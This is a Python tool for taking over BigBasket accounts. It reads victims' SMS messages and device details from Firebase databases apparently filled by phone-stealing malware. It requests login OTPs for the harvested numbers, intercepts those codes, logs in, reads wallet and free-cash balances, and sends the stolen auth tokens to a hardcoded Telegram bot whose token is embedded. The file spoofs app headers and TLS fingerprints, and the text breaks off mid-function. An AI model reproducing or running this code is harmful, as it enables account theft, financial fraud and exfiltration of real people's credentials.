#!/usr/bin/env python3
"""
BigBasket Bypass — BACKGROUND WORKER EDITION
- No HTTP server needed (Background Worker me kaam nahi aata)
- Better OTP detection
- Longer OTP wait (SMS delay handle)
- Auto-resume from used.json
"""

import os, re, sys, json, time, uuid, base64, signal, asyncio
import logging, threading
from datetime import datetime
from typing import Optional, Dict, List, Set, Any, Tuple

import aiohttp
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    import tls_client
    HAS_TLS = True
except ImportError:
    HAS_TLS = False


# ============================================================
# COLORS
# ============================================================
class C:
    RESET="\033[0m"; BOLD="\033[1m"; DIM="\033[2m"
    RED="\033[91m"; GREEN="\033[92m"; YELLOW="\033[93m"
    BLUE="\033[94m"; MAGENTA="\033[95m"; CYAN="\033[96m"
    ORANGE="\033[38;5;208m"; GRAY="\033[38;5;245m"
    @staticmethod
    def ok(s):    return f"{C.GREEN}{C.BOLD}{s}{C.RESET}"
    @staticmethod
    def err(s):   return f"{C.RED}{C.BOLD}{s}{C.RESET}"
    @staticmethod
    def warn(s):  return f"{C.YELLOW}{C.BOLD}{s}{C.RESET}"
    @staticmethod
    def info(s):  return f"{C.CYAN}{s}{C.RESET}"
    @staticmethod
    def head(s):  return f"{C.MAGENTA}{C.BOLD}{s}{C.RESET}"
    @staticmethod
    def money(s): return f"{C.ORANGE}{C.BOLD}{s}{C.RESET}"
    @staticmethod
    def dev(s):   return f"{C.BLUE}{s}{C.RESET}"
    @staticmethod
    def dim(s):   return f"{C.GRAY}{s}{C.RESET}"


def log(*a, **kw):
    kw.setdefault("flush", True)
    print(*a, **kw)


# ============================================================
# CONFIG
# ============================================================
BOT_TOKEN = "8193791477:AAEVazSxsLxFI1RWiQ4RTmSOObqV_-gy1YI"
CHAT_ID   = 8287613405

FIREBASE_FILE = "firebase.txt"
USED_FILE     = "used.json"

# ⬆ OTP timing (SMS delay ke hisaab se)
OTP_WAIT_SECONDS       = 45      # 25 → 45
OTP_FAST_SKIP_AFTER    = 35      # 20 → 35
OTP_HEARTBEAT_EVERY    = 5

FB_REQUEST_TIMEOUT     = 6
FB_RETRY_MAX           = 4
FB_RETRY_BACKOFF       = 1.0
FB_MESSAGES_PER_CLIENT_LIMIT = 150
FB_CLIENTS_MAX_BYTES   = 80 * 1024 * 1024

FB_CONCURRENCY         = 20
DEVICES_PARALLEL       = 5
FB_SCAN_CONCURRENCY    = 15

MIN_BALANCE_TO_SEND    = 1
AUTO_RERUN_DELAY       = 0

SIGTERM_GRACE_SECONDS  = 10

logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s | %(levelname)s | %(message)s",
                    force=True)
logger = logging.getLogger("DarkScript")


# ============================================================
# SHUTDOWN FLAG
# ============================================================
SHUTDOWN_REQUESTED = threading.Event()


# ============================================================
# USED TRACKER
# ============================================================
class UsedTracker:
    def __init__(self, path=USED_FILE):
        self.path = path
        self._lock = threading.Lock()
        self.data = self._load()
        self._dirty = False

    def _load(self):
        try:
            if os.path.exists(self.path):
                with open(self.path, "r", encoding="utf-8") as f:
                    d = json.load(f)
                if isinstance(d, dict): return d
        except Exception as e:
            logger.warning(f"used.json load: {e}")
        return {}

    def save(self):
        with self._lock:
            if not self._dirty: return
            try:
                tmp = f"{self.path}.tmp"
                with open(tmp, "w", encoding="utf-8") as f:
                    json.dump(self.data, f, indent=2, ensure_ascii=False)
                os.replace(tmp, self.path)
                self._dirty = False
            except Exception as e:
                logger.error(f"save: {e}")

    @staticmethod
    def _key(d, p): return f"{d}:{p}"

    def is_used(self, d, p):
        with self._lock: return self._key(d, p) in self.data

    def count(self):
        with self._lock: return len(self.data)

    def mark_used(self, d, p, wallet=0, freecash=0, fb_url=""):
        with self._lock:
            self.data[self._key(d, p)] = {
                "device_id": d, "phone": p,
                "wallet": int(wallet), "freecash": int(freecash),
                "total": int(wallet)+int(freecash), "fb_url": fb_url,
                "logged_at": datetime.now().isoformat(),
                "timestamp": int(time.time()),
            }
            self._dirty = True
        self.save()


USED = UsedTracker(USED_FILE)


# ============================================================
# PATTERNS (broader OTP coverage)
# ============================================================
PHONE_PATTERNS = [
    re.compile(r'(?:Jio|JIO)\s+(?:Number|नंबर|Nambhar|নম্বৰ|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
    re.compile(r'(?:Airtel|AIRTEL)\s+(?:Number|नंबर|Nambhar|নম্বৰ|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
    re.compile(r'(?:Vi|VI|Vodafone|VODAFONE|Idea|IDEA)\s+(?:Number|नंबर|Nambhar|নম্বৰ|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
    re.compile(r'(?:BSNL|bsnl)\s+(?:Number|नंबर|Nambhar|নম্বৰ|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
    re.compile(r'(?:MTNL|mtnl)\s+(?:Number|नंबर|Nambhar|নম্বৰ|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
    re.compile(r'(?:Docomo|DOCOMO|Tata)\s+(?:Number|नंबर|Nambhar|নম্বৰ|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
    re.compile(r'(?:Reliance|RELIANCE)\s+(?:Number|नंबर|Nambhar|নম্বৰ|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
    re.compile(r'(?:Telenor|TELENOR)\s+(?:Number|नंबर|Nambhar|নম্বৰ|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
    re.compile(r'(?:Uninor|UNINOR)\s+(?:Number|नंबर|Nambhar|নম্বৰ|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
    re.compile(r'(?:Videocon|VIDEOCON)\s+(?:Number|नंबर|Nambhar|নম্বৰ|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
    re.compile(r'(?:नंबर|নম্বৰ)\s*[:\-]\s*([6-9][0-9]{9})'),
    re.compile(r'(?:your\s+)?(?:mobile|mob\.?|phone|contact)\s+(?:no\.?|number|num|नंबर)\s*[:\-]\s*(\+?91[-\s]?[6-9][0-9]{9})', re.I),
    re.compile(r'(?:your\s+)?(?:mobile|mob\.?|phone|contact)\s+(?:no\.?|number|num|नंबर)\s*[:\-]\s*([6-9][0-9]{9})', re.I),
    re.compile(r'Number\s*[:\-]\s*([6-9][0-9]{9})', re.I),
    re.compile(r'registered\s+(?:mobile\s+)?(?:number|no\.?)\s*[:\-]?\s*([6-9][0-9]{9})', re.I),
    re.compile(r'(\+91[-\s]?[6-9][0-9]{9})'),
    re.compile(r'(?:\b91)([6-9][0-9]{9})\b'),
    re.compile(r'(?:^|\s|:)([6-9][0-9]{9})(?:\s|$|\.)')
]

# 🔥 BROADER OTP PATTERNS (6 digits, any context)
OTP_PATTERNS = [
    re.compile(r'(?<!\d)(\d{6})(?!\d)'),  # any 6-digit sequence
]

# 🔥 BROADER KEYWORDS — zyada keywords, kam strict
OTP_KEYWORDS = [
    'bigbasket', 'big basket', 'bbnow', 'login code', 'bgcity',
    'otp', 'verification', 'tataneu', 'tata', 'basket', 'code',
    'bb', 'login', 'verify', 'auth',
]

# 🔥 BLOCKLIST — in messages me OTP nahi hoga
OTP_BLOCKLIST = ['% off', 'sale', 'offer', 'discount', 'cashback', 'coupon']


# ============================================================
# HELPERS
# ============================================================
def load_firebase_urls():
    if not os.path.exists(FIREBASE_FILE):
        with open(FIREBASE_FILE, "w") as f:
            f.write("# Ek line me ek firebase URL\n")
        return []
    urls = []
    with open(FIREBASE_FILE, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"): continue
            urls.append(line)
    return urls


def normalize_fb_url(url):
    try:
        if not url or not isinstance(url, str): return None
        u = url.strip()
        if "?s=" in u:
            try:
                s = u.split("?s=")[1].split("&")[0]
                s += "=" * ((4 - len(s) % 4) % 4)
                dec = base64.b64decode(s).decode("utf-8", errors="ignore")
                if dec.startswith("{"):
                    j = json.loads(dec)
                    u = j.get("url") or j.get("firebase") or u
                else:
                    u = dec.split("|")[0].strip()
            except Exception: return None
        if not u.startswith("http"): return None
        if "firebaseio.com" not in u and "firebasedatabase.app" not in u: return None
        u = u.rstrip("/")
        while u.endswith(".json"): u = u[:-5].rstrip("/")
        return u
    except Exception: return None


def build_fb_endpoint(base_url, path="", query=""):
    base = base_url.rstrip("/")
    p = (path or "").strip("/")
    q = (query or "").strip().lstrip("?")
    url = f"{base}/{p}/.json" if p else f"{base}/.json"
    if q: url += f"?{q}"
    return url


def _get_device_name(info, cid):
    if not isinstance(info, dict): return cid
    for k in ("modelName","model","deviceName"):
        v = info.get(k)
        if v and str(v).strip() and str(v) != "-": return str(v).strip()
    return cid


def _clean_phone(raw):
    if not raw: return None
    d = re.sub(r'\D','',str(raw))
    if len(d)==12 and d.startswith('91'): d=d[2:]
    elif len(d)==11 and d.startswith('0'): d=d[1:]
    if len(d)==10 and d[0] in '6789': return d
    return None


def _newest_messages(msgs, limit=FB_MESSAGES_PER_CLIENT_LIMIT):
    if not isinstance(msgs, dict): return []
    try:
        keys = sorted(msgs.keys(), key=lambda x: int(x), reverse=True)
    except (TypeError, ValueError):
        keys = list(msgs.keys())[::-1]
    return [msgs[k] for k in keys[:limit] if isinstance(msgs.get(k), dict)]


def extract_all_phones_from_device(info, messages, cid):
    phones = set()
    if isinstance(info, dict):
        for k in ("mobNo","mob_no","mobile","phoneNumber","phone"):
            p = _clean_phone(info.get(k))
            if p: phones.add(p)
        sims = info.get("sims")
        sl = sims if isinstance(sims, list) else (list(sims.values()) if isinstance(sims, dict) else [])
        for sim in sl:
            if isinstance(sim, dict):
                for k in ("phoneNumber","phone","mobNo","number"):
                    p = _clean_phone(sim.get(k))
                    if p: phones.add(p)
    if isinstance(messages, dict):
        for m in _newest_messages(messages, limit=FB_MESSAGES_PER_CLIENT_LIMIT):
            text = str(m.get("body") or m.get("message") or m.get("text") or m.get("msg") or "")
            if not text: continue
            for pat in PHONE_PATTERNS:
                try:
                    for num in pat.findall(text):
                        p = _clean_phone(num)
                        if p: phones.add(p)
                except Exception: continue
    return sorted(phones)


def _extract_otp_from_text(text):
    """
    Broader OTP extraction:
    - Check blocklist (promo messages)
    - Prefer messages with OTP keywords
    - Fallback: any 6-digit in BigBasket/Tata context
    """
    if not text: return None
    tl = text.lower()

    # blocklist first
    if any(b in tl for b in OTP_BLOCKLIST):
        return None

    # must have at least one OTP keyword
    if not any(kw in tl for kw in OTP_KEYWORDS):
        return None

    for pat in OTP_PATTERNS:
        try: m = pat.search(text)
        except Exception: continue
        if not m: continue
        try: grp = m.group(1)
        except Exception: grp = None
        raw = grp if grp is not None else m.group(0)
        otp = re.sub(r'\D','', raw or '')
        if len(otp)==6 and otp.isdigit():
            # ignore year-like values
            if otp.startswith(('19','20')) and otp[2:4] in ('00','01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26'):
                continue
            return otp
    return None


# ============================================================
# FIREBASE CORE
# ============================================================
class FBStatus:
    SUCCESS="SUCCESS"; ACCESS_DENIED="ACCESS_DENIED"; NOT_FOUND="NOT_FOUND"
    TIMEOUT="TIMEOUT"; CONNECTION_ERROR="CONNECTION_ERROR"
    INVALID_JSON="INVALID_JSON"; EMPTY_DATA="EMPTY_DATA"
    HTTP_ERROR="HTTP_ERROR"; TOO_LARGE="TOO_LARGE"; OTHER_ERROR="OTHER_ERROR"


async def fb_get_json(session, url, *, timeout=FB_REQUEST_TIMEOUT,
                      max_bytes=FB_CLIENTS_MAX_BYTES, retries=FB_RETRY_MAX):
    last = ""
    for attempt in range(retries + 1):
        if SHUTDOWN_REQUESTED.is_set(): return None, FBStatus.OTHER_ERROR, "sd"
        try:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=timeout)) as resp:
                st = resp.status
                if st == 413: return None, FBStatus.TOO_LARGE, "413"
                cl = resp.headers.get("Content-Length")
                if cl and cl.isdigit() and int(cl) > max_bytes:
                    return None, FBStatus.TOO_LARGE, "big"
                body = b""
                async for chunk in resp.content.iter_chunked(8192):
                    body += chunk
                    if len(body) > max_bytes: return None, FBStatus.TOO_LARGE, "big"
                text = body.decode("utf-8", errors="ignore").strip()
                if st in (401,403): return None, FBStatus.ACCESS_DENIED, f"HTTP {st}"
                if st == 404: return None, FBStatus.NOT_FOUND, "404"
                if st in (408,504):
                    last = f"HTTP {st}"
                    if attempt < retries:
                        await asyncio.sleep(FB_RETRY_BACKOFF); continue
                    return None, FBStatus.TIMEOUT, last
                if st == 429 or 500 <= st < 600:
                    last = f"HTTP {st}"
                    if attempt < retries:
                        await asyncio.sleep(FB_RETRY_BACKOFF); continue
                    return None, FBStatus.HTTP_ERROR, last
                if st >= 400: return None, FBStatus.HTTP_ERROR, f"HTTP {st}"
                if not text or text == "null": return None, FBStatus.EMPTY_DATA, "null"
                try: data = json.loads(text)
                except json.JSONDecodeError: return None, FBStatus.INVALID_JSON, "json"
                if data is None: return None, FBStatus.EMPTY_DATA, "null"
                return data, FBStatus.SUCCESS, ""
        except asyncio.TimeoutError:
            last = "timeout"
            if attempt < retries:
                await asyncio.sleep(FB_RETRY_BACKOFF); continue
            return None, FBStatus.TIMEOUT, last
        except aiohttp.ClientError as e:
            last = type(e).__name__
            if attempt < retries:
                await asyncio.sleep(FB_RETRY_BACKOFF); continue
            return None, FBStatus.CONNECTION_ERROR, last
        except Exception as e:
            last = str(e)[:80]
            if attempt < retries:
                await asyncio.sleep(FB_RETRY_BACKOFF); continue
            return None, FBStatus.OTHER_ERROR, last
    return None, FBStatus.OTHER_ERROR, last or "retries"


async def scan_firebase_summary(fb_url):
    r = {"total":0,"online":0,"offline":0,"status":FBStatus.OTHER_ERROR}
    conn = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
    s = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=FB_REQUEST_TIMEOUT), connector=conn)
    try:
        clients, st, _ = await fb_get_json(s, build_fb_endpoint(fb_url,"clients"), retries=FB_RETRY_MAX)
        if not isinstance(clients, dict):
            clients, st, _ = await fb_get_json(s, build_fb_endpoint(fb_url,"devices"), retries=FB_RETRY_MAX)
        if isinstance(clients, dict):
            r["total"] = len(clients)
            on = sum(1 for _,v in clients.items() if isinstance(v,dict) and v.get("status") is True)
            r["online"] = on
            r["offline"] = r["total"] - on
            r["status"] = FBStatus.SUCCESS
        else:
            r["status"] = st
    except Exception as e:
        logger.error(f"scan_summary: {e}")
    finally:
        try: await s.close()
        except Exception: pass
    return r


async def _fetch_device_messages(session, base_url, cid):
    q = f'orderBy="$key"&limitToLast={FB_MESSAGES_PER_CLIENT_LIMIT}'
    url = build_fb_endpoint(base_url, f"messages/{cid}", query=q)
    fetched, st, _ = await fb_get_json(session, url, max_bytes=FB_CLIENTS_MAX_BYTES, retries=FB_RETRY_MAX)
    if st == FBStatus.SUCCESS and isinstance(fetched, dict): return fetched
    return {}


async def get_online_devices(fb_url):
    conn = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
    s = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=FB_REQUEST_TIMEOUT), connector=conn)
    try:
        clients, st, _ = await fb_get_json(s, build_fb_endpoint(fb_url,"clients"), max_bytes=FB_CLIENTS_MAX_BYTES)
        if not isinstance(clients, dict):
            clients, st, _ = await fb_get_json(s, build_fb_endpoint(fb_url,"devices"), max_bytes=FB_CLIENTS_MAX_BYTES)
        if not isinstance(clients, dict): return {}
        ol = [(c,i) for c,i in clients.items() if isinstance(i,dict) and i.get("status") is True]
        result = {}
        sem = asyncio.Semaphore(FB_CONCURRENCY)
        async def _proc(cid, info):
            async with sem:
                name = _get_device_name(info, cid)
                msgs = await _fetch_device_messages(s, fb_url, cid) or {}
                phones = extract_all_phones_from_device(info, msgs, cid)
                return cid, {"name": name, "phones": phones, "messages": msgs}
        tasks = [asyncio.create_task(_proc(c,i)) for c,i in ol]
        for r in await asyncio.gather(*tasks, return_exceptions=True):
            if isinstance(r, Exception) or r is None: continue
            cid, payload = r
            result[cid] = payload
        return result
    finally:
        try: await s.close()
        except Exception: pass


# ============================================================
# OTP FETCH
# ============================================================
def _fetch_current_otps(fb_url, client_id):
    baseline = set()
    try:
        s = requests.Session(); s.verify = False
        url = f"{fb_url.rstrip('/')}/messages/{client_id}.json"
        resp = None
        for _ in range(FB_RETRY_MAX + 1):
            try: resp = s.get(url, timeout=5); break
            except Exception: time.sleep(0.5)
        if resp is None or resp.status_code != 200: return baseline
        data = resp.json()
        if not data or not isinstance(data, dict): return baseline
        for m in _newest_messages(data):
            if not isinstance(m, dict): continue
            body = str(m.get('body') or m.get('message') or m.get('text') or m.get('msg') or '')
            otp = _extract_otp_from_text(body)
            if otp: baseline.add(otp)
    except Exception as e:
        logger.warning(f"baseline: {e}")
    return baseline


def fetch_one_new_otp(fb_url, client_id, timeout, trigger_ms, baseline_otps):
    start = time.time()
    s = requests.Session(); s.verify = False
    base = fb_url.rstrip('/')
    last_hb = 0; seen_any = False
    last_log = 0

    while time.time() - start < timeout:
        if SHUTDOWN_REQUESTED.is_set():
            return None
        elapsed = int(time.time() - start)
        if elapsed > 0 and elapsed % OTP_HEARTBEAT_EVERY == 0 and elapsed != last_hb:
            last_hb = elapsed
            print(f"      {C.dim(f'⏳ {elapsed}s / {timeout}s ...')}", flush=True)
        if not seen_any and elapsed >= OTP_FAST_SKIP_AFTER:
            print(f"      {C.err('✗ skip (no OTP in {}s)'.format(OTP_FAST_SKIP_AFTER))}", flush=True)
            return None
        try:
            url = f"{base}/messages/{client_id}.json"
            resp = s.get(url, timeout=5)
            if resp.status_code != 200: time.sleep(0.5); continue
            data = resp.json()
            if not data or not isinstance(data, dict): time.sleep(0.5); continue
            found = []
            for msg_id, msg in data.items():
                if not isinstance(msg, dict): continue
                try: ts = int(msg_id)
                except (ValueError, TypeError): continue
                if ts < (trigger_ms - 90000): continue  # 90s window
                text = str(msg.get('body') or msg.get('message') or msg.get('text') or msg.get('msg') or '')
                otp = _extract_otp_from_text(text)
                if not otp: continue
                if otp in baseline_otps: continue
                found.append((ts, otp))
            if found:
                seen_any = True
                found.sort()
                return found[-1][1]
            time.sleep(0.4)
        except Exception:
            time.sleep(0.5)
    return None


# ============================================================
# BIGBASKET CLIENT
# ============================================================
class BigBasketClient:
    def __init__(self):
        self.device_id = uuid.uuid4().hex[:16]
        self.ref_id = None; self.bb_token = None
        self.visitor_id = None; self.m_id = None
        self.sa_ids = None; self.csurftoken = None
        self.wallet_details = {}; self.freecash_details = {}
        self.last_otp_error = None; self.last_login_response = {}
        self.session = None
        self._init_session()

    def _init_session(self):
        if HAS_TLS:
            try:
                self.session = tls_client.Session(client_identifier="chrome_120",
                                                   random_tls_extension_order=True)
            except Exception: self.session = requests.Session()
        else:
            self.session = requests.Session()
        try:
            self.session.proxies = {}
            self.session.headers.update({
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9',
                'user-agent': 'BB Android/v8.35.0/os 15',
                'x-channel': 'BB-Android', 'x-entry-context': 'bb-b2c',
                'x-tcp-platform': 'native',
                'x-tcp-device-version': 'android_8.35.0_25113510',
                'common-client-static-version': '104',
                'x-device-model': 'Samsung SM-A536E',
                'x-pharma': 'true', 'x-bucket-id': '50',
            })
        except Exception as e:
            logger.error(f"init: {e}")

    def _request(self, method, url, **kw):
        for attempt in range(FB_RETRY_MAX + 1):
            try:
                fn = getattr(self.session, method.lower(), None)
                return fn(url, **kw) if fn else self.session.request(method, url, **kw)
            except Exception:
                if attempt < FB_RETRY_MAX: time.sleep(0.5); continue
                return None
        return None

    def _set_cookie(self, n, v):
        try:
            if hasattr(self.session, "cookies"):
                if n in self.session.cookies: del self.session.cookies[n]
                if v is not None: self.session.cookies.set(n, v)
        except Exception: pass

    def _update_cookies(self, r):
        try:
            if r and hasattr(r, "cookies"):
                for k, v in r.cookies.items():
                    self._set_cookie(k, v)
                    if k == "csurftoken": self.csurftoken = v
        except Exception: pass

    def register_device(self):
        try:
            ex = self.session.cookies.get("_bb_vid") if hasattr(self.session,"cookies") else None
            if ex: self.visitor_id = ex; return True
            payload = {"imei":"02:00:00:00:00:00","device_id":self.device_id,"city_id":"1",
                       "properties":json.dumps({"platform":"java","os_name":"android","os_version":"15",
                                                "app_version":"8.35.0","device_make":"Samsung",
                                                "device_model":"SM-A536E","screen_resolution":"900X1600",
                                                "screen_dpi":240})}
            r = self._request("POST","https://www.bigbasket.com/mapi/v4.2.0/register/device/", data=payload)
            if r and r.status_code == 200:
                d = r.json()
                self.visitor_id = (d.get("response",{}).get("visitor_id") or r.cookies.get("_bb_vid")
                                   or str(int(time.time()*1000))+uuid.uuid4().hex[:8])
                self._update_cookies(r)
                return True
            self.visitor_id = str(int(time.time()*1000))+uuid.uuid4().hex[:8]
            return True
        except Exception:
            self.visitor_id = str(int(time.time()*1000))+uuid.uuid4().hex[:8]
            return True

    def load_ui_data(self):
        for url in ["https://www.bigbasket.com/ui-svc/v2/header/?send_door_info=true",
                    "https://www.bigbasket.com/ui-svc/v1/app-data?os_name=android&app_version=8.35.0"]:
            try:
                r = self._request("GET", url); self._update_cookies(r)
            except Exception: pass
        return True

    def update_device_info(self):
        try:
            self.session.headers.update({"content-type":"application/x-www-form-urlencoded"})
            r = self._request("POST","https://www.bigbasket.com/mapi/v4.2.0/update/device/info/",
                              data={"ad_id":"3e0d3f64-3657-40af-9095-c0f4fc692d8e"})
            self._update_cookies(r)
        except Exception: pass
        return True

    def request_otp(self, mobile):
        try:
            self.session.headers.update({"content-type":"application/json"})
            r = self._request("POST","https://www.bigbasket.com/member-tdl/v3/member/otp/",
                              json={"identifier": mobile, "referrer": "unified_login"})
            if not r: self.last_otp_error = "No response"; return False
            self._update_cookies(r)
            if r.status_code == 200:
                d = r.json()
                if "refId" in d: self.ref_id = d["refId"]; self.last_otp_error = None; return True
                self.last_otp_error = "Missing refId"; return False
            msg = ""
            try:
                ed = r.json()
                errs = ed.get("errors", []) if isinstance(ed, dict) else []
                if errs: msg = errs[0].get("msg") or errs[0].get("display_msg") or ""
            except Exception: pass
            self.last_otp_error = msg or f"HTTP {r.status_code}"
            return False
        except Exception as e:
            self.last_otp_error = str(e); return False

    def verify_otp(self, mobile, otp):
        try:
            if not self.ref_id: self.last_otp_error = "No ref_id"; return False
            r = self._request("POST","https://www.bigbasket.com/member-tdl/v3/member/unified-login/",
                              json={"mobile_no": mobile, "mobile_no_otp": otp, "refId": self.ref_id})
            if not r: self.last_otp_error = "No response"; return False
            self._update_cookies(r)
            try: self.last_login_response = r.json() if r.content else {}
            except Exception: self.last_login_response = {"raw": getattr(r,"text","")[:2000]}
            if r.status_code == 200:
                d = self.last_login_response
                if "bb_token" in d:
                    self.bb_token = d["bb_token"]
                    self._set_cookie("BBAUTHTOKEN", self.bb_token)
                    self.m_id = d.get("m_id"); self.visitor_id = d.get("visitor_id")
                    self.csurftoken = self.session.cookies.get("csurftoken") if hasattr(self.session,"cookies") else None
                    return True
                if "errors" in d and d["errors"]:
                    self.last_otp_error = d["errors"][0].get("msg","Unknown"); return False
                self.last_otp_error = "Unknown response"; return False
            self.last_otp_error = f"HTTP {r.status_code}"; return False
        except Exception as e:
            self.last_otp_error = str(e); return False

    def refresh_session(self):
        try:
            r = self._request("GET","https://www.bigbasket.com/ui-svc/v2/header/?send_door_info=true")
            self._update_cookies(r)
            self.csurftoken = self.session.cookies.get("csurftoken") if hasattr(self.session,"cookies") else None
            sa = self.session.cookies.get("_bb_sa_ids") if hasattr(self.session,"cookies") else None
            if sa: self.sa_ids = sa
        except Exception: pass
        return True

    def get_wallet_details(self):
        if not self.bb_token: return None
        try:
            self.refresh_session()
            self.session.headers.update({"content-type":"application/json","x-entry-context-id":"100",
                                          "x-entry-context":"bb-b2c","x-tracker":str(uuid.uuid4()),
                                          "x-pharma":"true"})
            if self.csurftoken: self.session.headers["x-csurftoken"] = self.csurftoken
            self._set_cookie("_bb_source","app"); self._set_cookie("_bb_vid", self.visitor_id)
            self._set_cookie("_bb_mid", self.m_id)
            if self.sa_ids: self._set_cookie("_bb_sa_ids", self.sa_ids)
            r = self._request("GET","https://www.bigbasket.com/wallet/v1/details")
            if r and r.status_code == 200:
                self.wallet_details = r.json(); return self.wallet_details
            return None
        except Exception as e:
            logger.error(f"wallet: {e}"); return None

    def get_free_cash(self):
        if not self.bb_token: return None
        try:
            self.refresh_session()
            h = {"content-type":"application/json","x-retry":"0",
                 "x-tcp-device-version":"android_8.38.0_25115710",
                 "common-client-static-version":"105","x-bucket-id":"36",
                 "x-channel":"BB-Android","x-tracker":str(uuid.uuid4()),
                 "x-entry-context":"bb-b2c","x-entry-context-id":"100"}
            if self.csurftoken: h["x-csurftoken"] = self.csurftoken
            for k, v in h.items(): self.session.headers[k] = v
            payload = {"freecash_v2_enabled": True, "sa_city_ids":[18],
                       "sa_ids":[int(self.sa_ids) if self.sa_ids else 28425],
                       "context":"homepage","page_type":None,"channel":"BB-Android"}
            r = self._request("POST","https://www.bigbasket.com/ui-svc/v1/free-cash/", json=payload)
            if r and r.status_code == 200:
                self.freecash_details = r.json(); return self.freecash_details
            return None
        except Exception as e:
            logger.error(f"freecash: {e}"); return None


# ============================================================
# TELEGRAM
# ============================================================
def _build_clean_json(client):
    return {"bbAuthToken": client.bb_token or "", "mId": client.m_id or "", "bbVisitorId": client.visitor_id or ""}


async def send_telegram_alert(fb_url, device_id, phone, client, wallet, freecash, otp=""):
    base = f"https://api.telegram.org/bot{BOT_TOKEN}"
    total = int(wallet) + int(freecash)
    try:
        async with aiohttp.ClientSession() as s:
            try:
                clean = _build_clean_json(client)
                jb = json.dumps(clean, indent=2, ensure_ascii=False).encode("utf-8")
                form = aiohttp.FormData()
                form.add_field("chat_id", str(CHAT_ID))
                form.add_field("document", jb, filename=f"{phone}_{total}.json",
                               content_type="application/json")
                form.add_field("caption", f"OK | W=₹{int(wallet)} F=₹{int(freecash)} T=₹{total} →")
                await s.post(f"{base}/sendDocument", data=form,
                             timeout=aiohttp.ClientTimeout(total=30))
            except Exception as e:
                logger.error(f"sendDoc: {e}")
        logger.info(f"[TG] Sent {phone} | ₹{total}")
    except Exception as e:
        logger.error(f"[TG] {e}")


# ============================================================
# PHONE PROCESSING
# ============================================================
async def _process_one_phone(device_id, phone, fb_url):
    client = BigBasketClient()
    try:
        baseline = await asyncio.to_thread(_fetch_current_otps, fb_url, device_id)
        await asyncio.to_thread(client.register_device)
        await asyncio.to_thread(client.load_ui_data)
        await asyncio.to_thread(client.update_device_info)

        ok = await asyncio.to_thread(client.request_otp, phone)
        if not ok:
            log(f"      {C.err('❌ OTP send failed')} → {phone} ({client.last_otp_error})")
            return {"phone": phone, "device_id": device_id, "success": False,
                    "error": f"OTP: {client.last_otp_error}"}
        log(f"      {C.ok('✅ OTP sent')} → {C.BOLD}{phone}{C.RESET}")

        trigger_ms = int(time.time() * 1000)
        otp = await asyncio.to_thread(fetch_one_new_otp, fb_url, device_id,
                                       OTP_WAIT_SECONDS, trigger_ms, baseline)
        if not otp:
            log(f"      {C.err('✗ No OTP')} → {phone}")
            return {"phone": phone, "device_id": device_id, "success": False, "error": "no OTP"}

        log(f"      {C.info('🔐 Verifying')} {phone} {C.dim('OTP=')}{C.BOLD}{otp}{C.RESET}")
        verified = await asyncio.to_thread(client.verify_otp, phone, otp)
        if not verified:
            log(f"      {C.err('✗ Verify failed')} → {phone} ({client.last_otp_error})")
            return {"phone": phone, "device_id": device_id, "success": False,
                    "error": f"Verify: {client.last_otp_error}"}

        w = await asyncio.to_thread(client.get_wallet_details) or {}
        f = await asyncio.to_thread(client.get_free_cash) or {}
        wb = int(w.get("current_wallet_balance", 0) or 0)
        fb = int(f.get("total_freecash_amount", 0) or 0)
        tc = wb + fb

        USED.mark_used(device_id, phone, wallet=wb, freecash=fb, fb_url=fb_url)

        if tc >= MIN_BALANCE_TO_SEND:
            log(f"      {C.ok('✅ OK')} {phone} | {C.money('₹'+str(wb))}+{C.money('₹'+str(fb))}"
                f"={C.head('₹'+str(tc))} → {C.GREEN}TG{C.RESET}")
            await send_telegram_alert(fb_url, device_id, phone, client, wb, fb, otp)
        else:
            log(f"      {C.ok('✅ OK')} {phone} | {C.dim('₹0 → skip TG')}")

        return {"phone": phone, "device_id": device_id, "success": True,
                "wallet": wb, "freecash": fb, "total": tc, "otp": otp}
    except Exception as e:
        log(f"      {C.err('✗ Error')} {phone}: {e}")
        return {"phone": phone, "device_id": device_id, "success": False, "error": str(e)[:120]}
    finally:
        try: client.session.close()
        except Exception: pass


async def process_device_all_phones(device_id, device_info, fb_url, dev_idx, dev_total):
    phones_all = device_info.get("phones", [])
    fresh = [p for p in phones_all if not USED.is_used(device_id, p)]
    skipped = [p for p in phones_all if USED.is_used(device_id, p)]
    name = device_info.get("name", device_id[:12])

    log(f"\n   {C.head('━' * 70)}")
    log(f"   {C.head(f'📱 DEV {dev_idx}/{dev_total}')} {C.dev(name)} "
        f"→ {C.BOLD}{len(phones_all)}{C.RESET} phone(s)"
        + (f" {C.dim(f'(skip {len(skipped)})')}" if skipped else ""))
    log(f"   {C.head('━' * 70)}")

    if not fresh:
        log(f"   {C.dim('   All already used.')}")
        return []

    results = []
    for i, phone in enumerate(fresh, 1):
        if SHUTDOWN_REQUESTED.is_set():
            log(f"   {C.warn('⚠️  Shutdown — stopping early')}")
            break
        log(f"\n   {C.info(f'▶ [{i}/{len(fresh)}]')} {C.BOLD}{phone}{C.RESET}")
        r = await _process_one_phone(device_id, phone, fb_url)
        results.append(r)
    return results


async def _process_devices_in_batches(devices_list, fb_url):
    all_results = []
    total = len(devices_list)
